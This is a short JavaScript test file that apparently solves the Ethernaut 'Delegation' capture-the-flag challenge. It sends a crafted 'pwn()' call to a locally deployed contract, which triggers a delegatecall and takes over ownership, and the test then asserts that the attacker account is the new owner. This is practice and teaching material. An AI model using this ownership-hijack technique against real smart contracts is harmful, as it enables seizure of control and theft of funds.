const { expect, assert } = require('chai');
const { BigNumber } = require('ethers');

describe('Delegation', function () {
  it('should solve the challenge', async function () {
    const [owner, alice] = await ethers.getSigners();

    // Deploy delegate
    const Delegate = await ethers.getContractFactory('Delegate');
    const delegate = await Delegate.deploy(owner.address);

    // Deploy challenge
    const Delegation = await ethers.getContractFactory('Delegation');
    const challenge = await Delegation.deploy(delegate.address);
    const oldOwner = await challenge.owner();
    assert(owner.address === oldOwner);

    const ABI = ['function pwn()'];
    const iface = new ethers.utils.Interface(ABI);
    const data = iface.encodeFunctionData('pwn', []);

    await alice.sendTransaction({
      to: challenge.address,
      data,
      gasLimit: BigNumber.from('100000'),
    });

    const newOwner = await challenge.owner();
    assert(alice.address === newOwner);
  });
});
